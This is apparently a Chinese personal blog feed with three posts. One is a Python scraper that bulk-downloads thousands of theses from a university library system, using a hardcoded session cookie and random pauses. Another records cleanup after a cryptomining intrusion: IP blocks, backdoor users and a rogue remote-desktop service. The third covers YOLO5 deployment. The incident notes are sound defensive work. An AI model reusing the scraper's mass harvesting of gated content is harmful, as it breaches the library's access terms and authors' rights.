class="line">            pd.write(pdf_data)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[INFO]:paper保存成功&#x27;</span>)  <span class="comment"># ，保存路径：&#123;save_path&#125;&#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        msg = <span class="string">f&#x27;[ERROR]:出现错误，错误信息：<span class="subst">&#123;e&#125;</span>&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br><span class="line">        <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化会话和变量</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.headers[<span class="string">&#x27;Cookie&#x27;</span>] = <span class="string">&#x27;JSESSIONID=0FF3DD11F5B3CCC09A45C795B75DF204&#x27;</span></span><br><span class="line">session.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">base_url = <span class="string">&#x27;2xx.xxx.xxx.xxx:8800&#x27;</span>  <span class="comment"># 图书馆的ip</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># POST请求获取论文列表</span></span><br><span class="line">body = <span class="string">&#x27;ffields=degree_type%3A%E5%8D%9A%E5%A3%AB%E5%90%8E%2C%E5%B7%A5%E5%AD%A6%E5%8D%9A%E5%A3%AB%2C%E7%90%86%E5%AD%A6%E5%8D%9A%E5%A3%AB%2C%E7%94%B5%E5%AD%90%E4%BF%A1%E6%81%AF%E7%A1%95%E5%A3%AB%2C%E5%B7%A5%E7%A8%8B%E7%A1%95%E5%A3%AB%2C%E5%B7%A5%E5%AD%A6%E7%A1%95%E5%A3%AB%2C%E7%90%86%E5%AD%A6%E7%A1%95%E5%A3%AB%3Aspecial%3Afuzzy%7Ccomplete_date_year%3A2024+OR+2023+OR+2022+OR+2021+OR+2020+OR+2019+OR+2018+OR+2017%3Aand%7Cdepartment%3A%E5%85%B6%E5%AE%83%E5%8D%95%E4%BD%8D%EF%BC%88%E6%A0%A1%E5%A4%96%EF%BC%89%2C%E5%85%B6%E5%AE%83%E5%8D%95%E4%BD%8D%EF%BC%88%E6%A0%A1%E5%86%85%EF%BC%89%2C%E6%95%B0%E5%AD%A6%E7%A7%91%E5%AD%A6%E5%AD%A6%E9%99%A2%2C%E7%89%A9%E7%90%86%E4%B8%8E%E7%94%B5%E5%AD%90%E7%A7%91%E5%AD%A6%E5%AD%A6%E9%99%A2%2C%E4%BF%A1%E6%81%AF%E5%AD%A6%E9%83%A8%2C%E7%90%86%E5%B7%A5%E5%AD%A6%E9%99%A2%2C%E8%BD%AF%E4%BB%B6%E5%AD%A6%E9%99%A2%2C%E9%87%91%E8%9E%8D%E4%B8%8E%E7%BB%9F%E8%AE%A1%E5%AD%A6%E9%99%A2%2C%E4%BF%A1%E6%81%AF%E7%A7%91%E5%AD%A6%E6%8A%80%E6%9C%AF%E5%AD%A6%E9%99%A2%2C%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B8%8E%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2%2C%E6%95%B0%E6%8D%AE%E7%A7%91%E5%AD%A6%E4%B8%8E%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2%3Aspecial%3Aexact%7Cxkcode%3A07*+OR+08*+OR+14*%3Aand&amp;ffieldstr=%E5%8D%9A%E5%A3%AB%E5%90%8E%26%E5%B7%A5%E5%AD%A6%E5%8D%9A%E5%A3%AB%26%E7%90%86%E5%AD%A6%E5%8D%9A%E5%A3%AB%26%E7%94%B5%E5%AD%90%E4%BF%A1%E6%81%AF%E7%A1%95%E5%A3%AB%26%E5%B7%A5%E7%A8%8B%E7%A1%95%E5%A3%AB%26%E5%B7%A5%E5%AD%A6%E7%A1%95%E5%A3%AB%26%E7%90%86%E5%AD%A6%E7%A1%95%E5%A3%AB%26%E5%85%B6%E5%AE%83%E5%8D%95%E4%BD%8D%EF%BC%88%E6%A0%A1%E5%A4%96%EF%BC%89%26%E5%85%B6%E5%AE%83%E5%8D%95%E4%BD%8D%EF%BC%88%E6%A0%A1%E5%86%85%EF%BC%89%26%E6%95%B0%E5%AD%A6%E7%A7%91%E5%AD%A6%E5%AD%A6%E9%99%A2%26%E7%89%A9%E7%90%86%E4%B8%8E%E7%94%B5%E5%AD%90%E7%A7%91%E5%AD%A6%E5%AD%A6%E9%99%A2%26%E4%BF%A1%E6%81%AF%E5%AD%A6%E9%83%A8%26%E7%90%86%E5%B7%A5%E5%AD%A6%E9%99%A2%26%E8%BD%AF%E4%BB%B6%E5%AD%A6%E9%99%A2%26%E9%87%91%E8%9E%8D%E4%B8%8E%E7%BB%9F%E8%AE%A1%E5%AD%A6%E9%99%A2%26%E4%BF%A1%E6%81%AF%E7%A7%91%E5%AD%A6%E6%8A%80%E6%9C%AF%E5%AD%A6%E9%99%A2%26%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B8%8E%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2%26%E6%95%B0%E6%8D%AE%E7%A7%91%E5%AD%A6%E4%B8%8E%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2%26%E7%90%86%E5%AD%A6%26%E5%B7%A5%E5%AD%A6%26%E4%BA%A4%E5%8F%89%E5%AD%A6%E7%A7%91&amp;searchkeyword=%E5%B7%A5%E5%AD%A6&amp;searchstrs=&amp;degree_check=%E5%8D%9A%E5%A3%AB%E5%90%8E&amp;degree_type_check=%E5%8D%9A%E5%A3%AB%E5%90%8E&amp;degree_check=%E5%8D%9A%E5%A3%AB&amp;degree_type_check=%E5%B7%A5%E5%AD%A6%E5%8D%9A%E5%A3%AB&amp;degree_type_check=%E7%90%86%E5%AD%A6%E5%8D%9A%E5%A3%AB&amp;degree_check=%E7%A1%95%E5%A3%AB&amp;degree_type_check=%E7%94%B5%E5%AD%90%E4%BF%A1%E6%81%AF%E7%A1%95%E5%A3%AB&amp;degree_type_check=%E5%B7%A5%E7%A8%8B%E7%A1%95%E5%A3%AB&amp;degree_type_check=%E5%B7%A5%E5%AD%A6%E7%A1%95%E5%A3%AB&amp;degree_type_check=%E7%90%86%E5%AD%A6%E7%A1%95%E5%A3%AB&amp;year_check=2024&amp;year_check=2023&amp;year_check=2022&amp;year_check=2021&amp;year_check=2020&amp;year_check=2019&amp;year_check=2018&amp;year_check=2017&amp;department_check=%E5%85%B6%E5%AE%83%E5%8D%95%E4%BD%8D%EF%BC%88%E6%A0%A1%E5%A4%96%EF%BC%89&amp;department_check=%E5%85%B6%E5%AE%83%E5%8D%95%E4%BD%8D%EF%BC%88%E6%A0%A1%E5%86%85%EF%BC%89&amp;department_check=%E6%95%B0%E5%AD%A6%E7%A7%91%E5%AD%A6%E5%AD%A6%E9%99%A2&amp;department_check=%E7%89%A9%E7%90%86%E4%B8%8E%E7%94%B5%E5%AD%90%E7%A7%91%E5%AD%A6%E5%AD%A6%E9%99%A2&amp;department_check=%E4%BF%A1%E6%81%AF%E5%AD%A6%E9%83%A8&amp;department_check=%E7%90%86%E5%B7%A5%E5%AD%A6%E9%99%A2&amp;department_check=%E8%BD%AF%E4%BB%B6%E5%AD%A6%E9%99%A2&amp;department_check=%E9%87%91%E8%9E%8D%E4%B8%8E%E7%BB%9F%E8%AE%A1%E5%AD%A6%E9%99%A2&amp;department_check=%E4%BF%A1%E6%81%AF%E7%A7%91%E5%AD%A6%E6%8A%80%E6%9C%AF%E5%AD%A6%E9%99%A2&amp;department_check=%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B8%8E%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2&amp;department_check=%E6%95%B0%E6%8D%AE%E7%A7%91%E5%AD%A6%E4%B8%8E%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2&amp;xkcode_check=07&amp;xkcode_check=08&amp;xkcode_check=14&#x27;</span></span><br><span class="line">response = session.post(<span class="string">f&#x27;http://<span class="subst">&#123;base_url&#125;</span>//zjresult_two.action&#x27;</span>, data=body)</span><br><span class="line"><span class="built_in">print</span>(response)</span><br><span class="line">go_on = <span class="number">1</span> <span class="comment">#中断后继续</span></span><br><span class="line"><span class="keyword">if</span> go_on &gt; <span class="number">20</span>:</span><br><span class="line">        pager = go_on//<span class="number">20</span>*<span class="number">20</span>  <span class="comment"># 整数除法</span></span><br><span class="line">        response = session.get(<span class="string">f&#x27;http://<span class="subst">&#123;base_url&#125;</span>/pagedown.action?pagenum=20&amp;pager.offset=<span class="subst">&#123;pager&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-----------开始爬取第-----------&quot;</span>+<span class="built_in">str</span>(pager//<span class="number">20</span>)+<span class="string">&quot;/317页：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(go_on, <span class="number">6334</span>):  <span class="comment"># 要下载的论文总数</span></span><br><span class="line">    <span class="comment"># 如果i是20的倍数，触发下一页</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在爬取第&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;篇&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">20</span> == <span class="number">0</span>:</span><br><span class="line">        pager = i//<span class="number">20</span>*<span class="number">20</span>  <span class="comment"># 整数除法</span></span><br><span class="line">        response = session.get(<span class="string">f&#x27;http://<span class="subst">&#123;base_url&#125;</span>/pagedown.action?pagenum=20&amp;pager.offset=<span class="subst">&#123;pager&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-----------开始爬取第-----------&quot;</span>+<span class="built_in">str</span>(pager//<span class="number">20</span>)+<span class="string">&quot;/317页：&quot;</span>)</span><br><span class="line">    <span class="comment"># 解析论文列表页面</span></span><br><span class="line">    tree = html.fromstring(response.content)</span><br><span class="line">    index = i % <span class="number">20</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;index取余20:&quot;</span>+<span class="built_in">str</span>(index))</span><br><span class="line">    onclick_attr = tree.xpath(<span class="string">f&#x27;//td/a/@onclick&#x27;</span>)[index]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;onclick_attr:&quot;</span>+<span class="built_in">str</span>(onclick_attr))</span><br><span class="line">    <span class="comment"># 使用正则表达式匹配 docinfo 中的两个参数提取id1和id2</span></span><br><span class="line">    match = re.search(<span class="string">r&quot;docinfo\(&#x27;([^&#x27;]+)&#x27;,&#x27;([^&#x27;]+)&#x27;\)&quot;</span>, onclick_attr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;match:&quot;</span> + <span class="built_in">str</span>(match))</span><br><span class="line">    <span class="keyword">if</span> match:</span><br><span class="line">        id1 = match.group(<span class="number">1</span>)  <span class="comment"># 第一个匹配的字符串</span></span><br><span class="line">        id2 = match.group(<span class="number">2</span>)  <span class="comment"># 第二个匹配的字符串</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;id1: <span class="subst">&#123;id1&#125;</span>, id2: <span class="subst">&#123;id2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取对应的论文信息</span></span><br><span class="line">        title = tree.xpath(<span class="string">f&#x27;//tr[<span class="subst">&#123;index + <span class="number">1</span>&#125;</span>]/td[2]/a/text()&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">        author = tree.xpath(<span class="string">f&#x27;//tr[<span class="subst">&#123;index + <span class="number">1</span>&#125;</span>]/td[3]/text()&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">        degree = tree.xpath(<span class="string">f&#x27;//tr[<span class="subst">&#123;index + <span class="number">1</span>&#125;</span>]/td[4]/text()&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">        date = tree.xpath(<span class="string">f&#x27;//tr[<span class="subst">&#123;index + <span class="number">1</span>&#125;</span>]/td[5]/text()&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构建文件名</span></span><br><span class="line">        file_name = <span class="string">f&quot;<span class="subst">&#123;degree&#125;</span>_<span class="subst">&#123;date&#125;</span>_<span class="subst">&#123;title&#125;</span>_<span class="subst">&#123;author&#125;</span>.pdf&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;File name: <span class="subst">&#123;file_name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># POST请求获取论文详情</span></span><br><span class="line">    body = <span class="string">f&#x27;id1=<span class="subst">&#123;id1&#125;</span>&amp;id2=<span class="subst">&#123;id2&#125;</span>&#x27;</span></span><br><span class="line">    paper_details = session.post(<span class="string">f&#x27;http://<span class="subst">&#123;base_url&#125;</span>/docinfo.action&#x27;</span>, data=body)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析论文详情页面</span></span><br><span class="line">    tree = html.fromstring(paper_details.content)</span><br><span class="line">    download_link = tree.xpath(<span class="string">&quot;//div[@class=&#x27;look btn&#x27;]/a/@href&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;download_link:&quot;</span> + <span class="built_in">str</span>(download_link))</span><br><span class="line">    <span class="comment"># 构建最终的下载链接</span></span><br><span class="line">    final_url = <span class="string">f&#x27;http://<span class="subst">&#123;base_url&#125;</span>/<span class="subst">&#123;download_link&#125;</span>&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;论文下载链接：&quot;</span> + <span class="built_in">str</span>(final_url))</span><br><span class="line">    save_path = <span class="string">r&#x27;C:\Users\18362\Downloads\paper\\&#x27;</span>  <span class="comment"># 避免转义‘</span></span><br><span class="line">    download_paper(save_path, final_url, file_name)</span><br><span class="line">    <span class="comment"># 生成一个2到60之间的随机整数</span></span><br><span class="line">    pause_time = random.randint(<span class="number">2</span>, <span class="number">60</span>)</span><br><span class="line">    <span class="comment"># 暂停程序</span></span><br><span class="line">    time.sleep(pause_time)</span><br></pre></td></tr></table></figure><p>大功告成，开始自动爬取论文</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240504152431060.png" alt="image-20240504152431060"></p>]]></content>
      
      
      <categories>
          
          <category> 折腾吧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> 论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>挖矿应急</title>
      <link href="2024/03/19/%E6%8A%98%E8%85%BE%E5%90%A7/%E6%8C%96%E7%9F%BF%E5%BA%94%E6%80%A5/"/>
      <url>2024/03/19/%E6%8A%98%E8%85%BE%E5%90%A7/%E6%8C%96%E7%9F%BF%E5%BA%94%E6%80%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="网络连接处理"><a href="#网络连接处理" class="headerlink" title="网络连接处理"></a>网络连接处理</h3><p>netstat -anop | grep ESTABLISHED</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240319155826976.png" alt="image-20240319155826976"></p><p>iptables封禁ip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">iptables -L</span><br><span class="line">Chain INPUT (policy ACCEPT)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy DROP)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">DOCKER-USER  all  --  anywhere             anywhere            </span><br><span class="line">DOCKER-ISOLATION-STAGE-1  all  --  anywhere             anywhere            </span><br><span class="line">ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED</span><br><span class="line">DOCKER     all  --  anywhere             anywhere            </span><br><span class="line">ACCEPT     all  --  anywhere             anywhere            </span><br><span class="line">ACCEPT     all  --  anywhere             anywhere            </span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain DOCKER (1 references)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain DOCKER-ISOLATION-STAGE-1 (1 references)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">DOCKER-ISOLATION-STAGE-2  all  --  anywhere             anywhere            </span><br><span class="line">RETURN     all  --  anywhere             anywhere            </span><br><span class="line"></span><br><span class="line">Chain DOCKER-ISOLATION-STAGE-2 (1 references)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">DROP       all  --  anywhere             anywhere            </span><br><span class="line">RETURN     all  --  anywhere             anywhere            </span><br><span class="line"></span><br><span class="line">Chain DOCKER-USER (1 references)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">RETURN     all  --  anywhere             anywhere            </span><br><span class="line">root@lenovo-05:/<span class="comment"># iptables -I INPUT -s 42.192.254.2 -j DROP</span></span><br><span class="line">root@lenovo-05:/<span class="comment"># iptables -I INPUT -s 23.88.60.195 -j DROP</span></span><br><span class="line">root@lenovo-05:/<span class="comment"># iptables -I INPUT -s 39.107.213.229 -j DROP</span></span><br><span class="line">root@lenovo-05:/<span class="comment"># iptables -I OUTPUT -d 39.107.213.229 -j DROP</span></span><br><span class="line">root@lenovo-05:/<span class="comment"># iptables -I OUTPUT -d 23.88.60.195 -j DROP</span></span><br><span class="line">root@lenovo-05:/<span class="comment"># iptables -I OUTPUT -d 42.192.254.2 -j DROP</span></span><br><span class="line">root@lenovo-05:/<span class="comment"># iptables -L</span></span><br><span class="line">Chain INPUT (policy ACCEPT)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">DROP       all  --  39.107.213.229       anywhere            </span><br><span class="line">DROP       all  --  static.195.60.88.23.clients.your-server.de  anywhere            </span><br><span class="line">DROP       all  --  42.192.254.2         anywhere            </span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy DROP)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">DOCKER-USER  all  --  anywhere             anywhere            </span><br><span class="line">DOCKER-ISOLATION-STAGE-1  all  --  anywhere             anywhere            </span><br><span class="line">ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED</span><br><span class="line">DOCKER     all  --  anywhere             anywhere            </span><br><span class="line">ACCEPT     all  --  anywhere             anywhere            </span><br><span class="line">ACCEPT     all  --  anywhere             anywhere            </span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">DROP       all  --  anywhere             42.192.254.2        </span><br><span class="line">DROP       all  --  anywhere             static.195.60.88.23.clients.your-server.de </span><br><span class="line">DROP       all  --  anywhere             39.107.213.229      </span><br><span class="line"></span><br><span class="line">Chain DOCKER (1 references)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain DOCKER-ISOLATION-STAGE-1 (1 references)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">DOCKER-ISOLATION-STAGE-2  all  --  anywhere             anywhere            </span><br><span class="line">RETURN     all  --  anywhere             anywhere            </span><br><span class="line"></span><br><span class="line">Chain DOCKER-ISOLATION-STAGE-2 (1 references)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">DROP       all  --  anywhere             anywhere            </span><br><span class="line">RETURN     all  --  anywhere             anywhere            </span><br><span class="line"></span><br><span class="line">Chain DOCKER-USER (1 references)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">RETURN     all  --  anywhere             anywhere      </span><br></pre></td></tr></table></figure><p>rcu_shader连接是没了（见用户文件处理部分，rcu这个文件属于lenovo用户下，直接userdel了），todesk和那个-矿池还在</p><p>删除todeskd服务（见后门处理部分），还剩-矿池，有意思的是禁了一个就又换了一个IP地址</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240319160205474.png" alt="image-20240319160205474"></p><p>根据端口查看进程和相关文件，还是没查到，</p><p>netstat -tunap</p><p>结果发现smbd，135，445端口在监听着，不需要和win之间共享，关闭systemctl stop/disable smbd/nmbd 这两个都属于samba服务，samba用于和win共享打印机和文件服务，关闭avahi-daemon服务（Linux系统中的一个服务，它实现了Zeroconf网络协议，也称为零配置网络。这项服务允许设备在没有DNS服务器的情况下自动发现网络上的其他设备和服务，如打印机和文件服务器。）</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240319170011572.png" alt="image-20240319170011572"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240319171304510.png" alt="image-20240319171304510"></p><p>netstat低版本有bug，Linux分配的进程连接的<a href="https://so.csdn.net/so/search?q=socket&spm=1001.2101.3001.7020">socket</a> id会逐渐增大。当服务器运行较长的一段时间，期间没有进行断电重启时，这个socket id将会超过 INT_MAX （即2^31）。而netstat的源代码中对socket id大于INT_MAX的进程不予处理。所以会显示为”-“代替。</p><p>可以下载当前系统netstat 1.6.0版源码， grep -r -i “cmdline”。在netstat.c文件找到处理cmdline的函数代码，具体看 <a href="https://blog.51cto.com/u_7682110/4810897">https://blog.51cto.com/u_7682110/4810897</a></p><p>重启后，由于清理了相关文件和自启动后这里的连接以及cpu高占用会自动消失。</p><h3 id="挖矿文件处理"><a href="#挖矿文件处理" class="headerlink" title="挖矿文件处理"></a>挖矿文件处理</h3><p>挖矿文件删不掉，去除i不可变属性</p><p>lsattr -R ./</p><p>chattr -i -R ./</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240319144455927.png" alt="image-20240319144455927"></p><h3 id="后门处理"><a href="#后门处理" class="headerlink" title="后门处理"></a>后门处理</h3><h4 id="todeskd服务删除"><a href="#todeskd服务删除" class="headerlink" title="todeskd服务删除"></a>todeskd服务删除</h4><p>systemctl list-unit-files –type=service | grep enabled</p><p>systemctl status/stop/disable todeskd</p><p>/etc/systemd/system/下找到并删除该todesk服务的systemd配置文件</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240319155035257.png" alt="image-20240319155035257"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240319155130659.png" alt="image-20240319155130659"></p><p>system deamon-reload重新加载配置生效</p><h4 id="shadow用户删除"><a href="#shadow用户删除" class="headerlink" title="shadow用户删除"></a>shadow用户删除</h4><h3 id="相关用户处理"><a href="#相关用户处理" class="headerlink" title="相关用户处理"></a>相关用户处理</h3><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240319150739138.png" alt="image-20240319150739138"></p><h4 id="伪装系统用户"><a href="#伪装系统用户" class="headerlink" title="伪装系统用户"></a>伪装系统用户</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pkill -u lenovo 删除<span class="built_in">kill</span>掉这个账户所有进程</span><br><span class="line">passwd -l lenovo 锁定该账户不允许登录</span><br><span class="line">userdel -r lenovo 删除账户（先备份用户文件夹取证）</span><br></pre></td></tr></table></figure><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240319152709130.png" alt="image-20240319152709130"></p><p>date -d “1970-01-01 +19761 days” +%Y-%m-%d 发现有5个用户敏感操作在2月2日，2月8日和3月13日</p><p>同上，删除伪装的server和bash用户，tutu用户在删除时报错userdel: user tutu is currently used by process 1</p><h4 id="隐藏的用户tutu"><a href="#隐藏的用户tutu" class="headerlink" title="隐藏的用户tutu"></a>隐藏的用户tutu</h4><p>userdel -r tutu删除时报错<br>userdel: user tutu is currently used by process 1</p><h4 id="root密钥后门"><a href="#root密钥后门" class="headerlink" title="root密钥后门"></a>root密钥后门</h4><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240319172111710.png" alt="image-20240319172111710"></p><p>发现刚好也是2月2日和3月13日午夜，看来这两起挖矿事件属于同一伙人</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240319172454851.png" alt="image-20240319172454851"></p><p>删除root已有密钥</p><h3 id="启动项检查"><a href="#启动项检查" class="headerlink" title="启动项检查"></a>启动项检查</h3><p>相关时间点无异常文件改动</p><h3 id="计划任务检查"><a href="#计划任务检查" class="headerlink" title="计划任务检查"></a>计划任务检查</h3><p>只有这个</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240319174413235.png" alt="image-20240319174413235"></p><p>找了对应目录，没有.cfg，倒是有个.config，用于清理痕迹的</p><p>netstat -ano</p><p>gpg？？？</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240319174916755.png" alt="image-20240319174916755"></p>]]></content>
      
      
      <categories>
          
          <category> 折腾吧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于YOLO5的智慧大棚系统</title>
      <link href="2024/01/15/AI%E7%AE%97%E6%B3%95/%E5%9F%BA%E4%BA%8EYOLO5%E7%9A%84%E6%99%BA%E6%85%A7%E5%A4%A7%E6%A3%9A%E7%B3%BB%E7%BB%9F/"/>
      <url>2024/01/15/AI%E7%AE%97%E6%B3%95/%E5%9F%BA%E4%BA%8EYOLO5%E7%9A%84%E6%99%BA%E6%85%A7%E5%A4%A7%E6%A3%9A%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="服务端部署"><a href="#服务端部署" class="headerlink" title="服务端部署"></a>服务端部署</h2><h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">nohup python3 server.py 2&gt;&amp;1 &amp; </span><br></pre></td></tr></table></figure><h4 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h4><p>在Unix/Linux系统中，每个运行的进程都有三个标准文件描述符：</p><ul><li>标准输入（stdin）： 文件描述符为0，通常用于接收输入。</li><li>标准输出（stdout）： 文件描述符为1，通常用于发送正常的输出。</li><li>标准错误（stderr）： 文件描述符为2，通常用于发送错误消息。</li></ul><p>2&gt;&amp;1是一种重定向语法，它将标准错误（文件描述符2）重定向到标准输出（文件描述符1）,通过将标准错误与标准输出合并，可以确保错误消息和正常输出都被记录在相同的输出流中。在这个具体的命令中，nohup 命令会将这个合并后的输出流写入到一个文件中（默认是 nohup.out），这样你可以在稍后查看进程的输出，包括错误消息。</p><p>在Unix/Linux的Shell脚本中，有许多重定向和管道操作符，允许你更灵活地处理输入、输出和错误。以下是一些常见的重定向和管道操作符：</p><ol><li><p><strong><code>&gt;</code></strong>: 将标准输出重定向到文件，如果文件存在则覆盖其内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bashCopy code</span><br><span class="line"><span class="built_in">command</span> &gt; output.txt</span><br></pre></td></tr></table></figure></li><li><p><strong><code>&gt;&gt;</code></strong>: 将标准输出追加到文件，如果文件存在则在其末尾添加内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 